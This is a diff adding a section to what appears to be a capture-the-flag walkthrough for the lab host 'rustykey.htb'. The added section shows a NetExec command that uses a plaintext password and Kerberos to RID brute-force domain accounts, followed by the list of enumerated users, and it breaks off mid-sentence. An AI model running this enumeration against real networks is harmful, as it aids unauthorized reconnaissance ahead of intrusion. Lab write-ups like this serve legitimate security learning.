@@ -133,5 +133,34 @@ Just default shares
 
 ## Users
 ```python
-
+❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC$
+Support-Computer1$
+Support-Computer2$
+Support-Computer3$
+Support-Computer4$
+Support-Computer5$
+Finance-Computer1$
+Finance-Computer2$
+Finance-Computer3$
+Finance-Computer4$
+Finance-Computer5$
+IT-Computer1$
+IT-Computer2$
+IT-Computer3$
+IT-Computer4$
+IT-Computer5$
+rr.parker
+mm.turner
+bb.morgan
+gg.anderson
+dd.ali
+ee.reed
+nn.marcos
+backupadmin
 ```
+
+Ill use `--rid-brute` to also get 
